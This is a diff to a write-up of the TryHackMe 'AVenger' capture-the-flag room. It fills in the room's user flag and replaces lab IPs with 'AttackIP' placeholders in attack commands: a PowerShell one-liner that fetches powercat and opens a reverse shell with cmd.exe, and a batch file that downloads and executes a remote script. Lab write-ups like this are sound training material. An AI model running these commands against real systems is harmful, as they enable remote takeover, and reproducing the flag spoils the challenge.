@@ -1,6 +1,6 @@
 <h1 align="center">AVenger</h1>
 <p align="center"><img width="80px" src="https://github.com/user-attachments/assets/f8d71468-229c-4347-8113-b834229b77f3"><br>
-<em>You’ve been asked to exploit all the vulnerabilities present.</em>.<br>
+<em>You’ve been asked to exploit all the vulnerabilities present</em>.<br>
 Access it <a href="https://tryhackme.com/room/avenger">here</a>.<br><br>
 July 20, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
 and I’m excited to join you on this adventure, part of my <code>440</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
@@ -28,7 +28,7 @@ The VM may take about 5 minutes to fully boot up.</p>
 <h3 align="left"> Answer the question below</h3>
 
 <p>1.1. Which is the user flag?<br>
-<code>_____</code></p>
+<code>THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}</code></p>
 
 <br>
 
@@ -446,7 +446,7 @@ Fingerprinting the version - Time: 00:00:05 <===================================
 <p><em>test.html</em></p>
 
 ```bash
-<img source="http://10.10.103.154:8000/rocket.jpg"/>
+<img source="http://AttackIP:8000/rocket.jpg"/>
 ```
 
 <img width="498" height="671" alt="image" src="https://github.com/user-attachments/assets/f68673c6-66bd-497d-b570-b0abf34049a9" />
@@ -456,7 +456,7 @@ Fingerprinting the version - Time: 00:00:05 <===================================
 <p><em>test.html</em></p>
 
 ```bash
-<img src="http://10.10.103.154:8000/rocket.jpg"/>
+<img src="http://AttackIP:8000/rocket.jpg"/>
 ```
 
 <img width="492" height="632" alt="image" src="https://github.com/user-attachments/assets/993aa167-f0b7-44e0-b9cc-ed216d94392d" />
@@ -475,7 +475,7 @@ Fingerprinting the version - Time: 00:00:05 <===================================
 <p><em>shell.txt</em></p>
 
 ```bash
-~/AVenger# pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.20.95.132 -p 4444 -e cmd.exe -ge" > /root/AVenger/shell.txt
+~/AVenger# pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c AttackIP -p AttackPort -e cmd.exe -ge" > /root/AVenger/shell.txt
 :~/AVenger# ls
 powercat.ps1  rocket.jpg  shell.txt  test.html
 ```
@@ -488,7 +488,7 @@ powercat.ps1  rocket.jpg  shell.txt  test.html
 <p><em>test.bat</em></p>
 
 ```bash
-START /B powershell -c $code=(New-Object System.Net.WebClient).DownloadString('http://10.10.95.132:8000/rev.txt');iex 'powershell -E $code'
+START /B powershell -c $code=(New-Object System.Net.WebClient).DownloadString('http://AttackIP:8000/rev.txt');iex 'powershell -E $code'
 ```
 
 <p>listener</p>
